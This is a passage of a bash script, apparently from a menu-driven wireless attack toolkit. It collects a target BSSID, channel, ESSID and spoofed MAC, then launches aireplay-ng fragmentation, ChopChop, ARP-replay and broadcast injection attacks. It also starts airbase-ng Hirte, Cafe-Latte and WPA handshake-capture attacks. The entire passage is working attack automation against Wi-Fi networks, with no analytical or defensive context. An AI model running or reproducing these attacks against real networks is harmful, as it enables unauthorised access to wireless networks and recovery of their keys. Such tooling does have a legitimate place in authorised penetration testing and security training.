~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                     --Attack Generation Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Replayed Packets per Burst {500 is Recommended} [$out$rppb$inp]

2) Tgt Channel                                     [$out$tc$inp]

3) Source MAC                                      [$out$sm$inp]

4) Tgt BSSID                                       [$out$b$inp]

5) ESSID {Optional}                                [$out$e$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
		read var
		case $var in
			1) echo -e "$inp\nReplayed Packets per Burst?"
			read rppb
			if [[ $rppb -gt 1000 ]];then
				rppb=1000
			elif [[ $rppb -lt 1 ]];then
				rppb=1
			fi
			rtech_II--;;

			2) parent_III="rtech"
			tchan--;;

			3) echo -e "$inp\nSource MAC?"
			read sm
			rtech_II--;;

			4) echo -e "$inp\nTgt BSSID?"
			read b
			rtech_II--;;

			5) echo -e "$inp\nTgt ESSID? (Leave Blank to Null)"
			read e
			rtech_II--;;

			c|C) if [[ -z $rppb || -z $tc || -z $sm || -z $b ]];then
				echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
				sleep 1
				rtech_II--
			fi;;

			p|P) rtech--;;

			m|M) main_menu--;;

			*) rtech_II--;;
		esac

		parent_II= ;; ## Nulled to prevent repeat looping that is NOT wanted!
	esac

	rtech_III--
	}

	rtech_III--()
	{
	st_1--
	iwconfig $pii channel $tc

	case $rt in
		1) frag_gen--;;
		2) chop_gen--;;
		3) arp_out--;;
		4) broad_out--;;
	esac

	rtech--
	}

	## Frag sub-functions
	frag_gen--()
	{
	if [[ -z $e ]];then
		Eterm -b black -f white --pause --title "Fragmentation Attack BSSID: $b" -e aireplay-ng -5 -b $b -h $sm $pii &
	else
		Eterm -b black -f white --pause --title "Fragmentation Attack ESSID: $e" -e aireplay-ng -5 -b $b -e "$e" -h $sm $pii &
	fi
	}

	## Chop sub-functions
	chop_gen--()
	{
	if [[ -z $e ]];then
		Eterm -b black -f white --pause --title "ChopChop Attack BSSID: $b" -e aireplay-ng -4 -b $b -h $sm $pii &
	else
		Eterm -b black -f white --pause --title "ChopChop Attack ESSID: $e" -e aireplay-ng -4 -b $b -e "$e" -h $sm $pii &
	fi
	}

	## ARP sub-function
	arp_out--()
	{
	Eterm -b black -f white --pause --title "ARP Attack" -e aireplay-ng $pii -3 -b $b -x $rppb -h $sm &
	}

	## Broadcast Attack sub-function
	broad_out--()
	### We need to add in a question whether or not they want the packets specifically pointing at the wired distribution side of the house via -t 1
	{
	Eterm -b black -f white --pause --title "Broadcast Attack" -e aireplay-ng $pii -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $b -x $rppb -h $sm &
	}

##~~~~~~~~~~~~~~~~ END wifi_101-- rtech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~ BEGIN wifi_101-- ctech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~##
	ctech_II--()
	{
	parent_VI= ## Nulled to prevent repeat looping that is NOT wanted!
	#e= ## tgt essid
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   --Packet Injection Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Tgt Channel  [$out$tc$inp]

2) SoftAP BSSID [$out$b$inp]

3) Tgt ESSID    [$out$e$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) parent_VI="ctech"
		tchan--;;

		2) echo -e "$inp\nDesired SoftAP BSSID?"
		read b
		ctech_II--;;

		3) echo -e "$inp\nTgt ESSID?"
		read e
		ctech_II--;;

		c|C) if [[ -z $tc || -z $b || -z $e ]];then
			echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			ctech_II--
		fi;;

		p|P) ctech--;;

		m|M) main_menu--;;

		*) ctech_II--;;
	esac

	st_1--
	clear
	case $ct in
		1) Eterm -b black -f white --pause --title "Hirte (AP)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 &
		sleep 2;;

		2) Eterm -b black -f white --pause --title "Hirte (Ad-Hoc)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 -A &
		sleep 2;;

		3) Eterm -b black -f white --pause --title "Cafe-Latte" -e airbase-ng $pii -c $tc -e "$e" -L -W 1 &
		sleep 2;;

		4) parent_VI="ctech"
		cfile--;;
	esac

	ctech--
	}
##~~~~~~~~~~~~~~~~~ END wifi_101-- ctech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~ BEGIN wifi_101-- WPA-- sub-functions ~~~~~~~~~~~~~~~~~~~##
	WPA_II--()
	{
	wpa_pid= ## PID for WPA attack Airodump-NG scan
	case $spec in
		1) case $wifu in
			1|2|3) wpa_warn--
			Eterm -b black -f white --pause --title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -F ab_$cf & wpa_pid=$! ;;

			7|8|9) wpa_warn--
			Eterm -b black -f white --pause --title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -y -F ab_$cf & wpa_pid=$! ;;
		esac;;

		2) wpa_warn--
		Eterm -b black -f white --pause --title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 $all_probe -F ab_$cf & wpa_pid=$! ;;
	esac

	WPA--
	}
##~~~~~~~~~~~~~~~~~~~~~ END wifi_101-- WPA-- sub-functions ~~~~~~~~~~~~~~~~~~~~##
## wifi_101-- Launcher
sm=$(ifconfig $pii | grep --color=never HWaddr | awk '{print $5}' | cut -c1-17 | tr [:upper:] [:lower:] | sed 's/-/:/g')
venue--
}
